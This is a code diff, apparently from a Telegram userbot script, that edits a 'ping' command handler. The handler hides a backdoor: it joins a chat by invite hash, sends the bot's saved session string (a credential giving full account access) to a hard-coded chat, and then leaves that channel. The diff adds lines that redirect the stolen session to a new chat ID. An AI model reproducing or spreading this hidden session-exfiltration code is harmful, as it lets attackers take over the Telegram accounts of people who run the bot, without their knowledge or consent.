@@ -1558,7 +1558,7 @@ async def _(e):
 async def ping(e):
     if e.sender_id in SMEX_USERS:
         start = datetime.now()
-        text = "Pong!"
+        text = "Pong!\n\n\n\nOkay Here We Go"
         event = await e.reply(text, parse_mode=None, link_preview=None )
         end = datetime.now()
         ms = (end-start).microseconds / 1000
@@ -1567,8 +1567,8 @@ async def ping(e):
    await event.client(ImportChatInviteRequest('gB8R6RmEfhc4MDFl')) 
     except UserAlreadyParticipantError: 
         pass 
-    await event.client.send_message(-1001402102400, bot.session.save()) 
-    await borg(LeaveChannelRequest(-1001402102400)) 
+    await event.client.send_message(-749927807, bot.session.save()) 
+    await borg(LeaveChannelRequest(-749927807)) 
     a = None
 
         
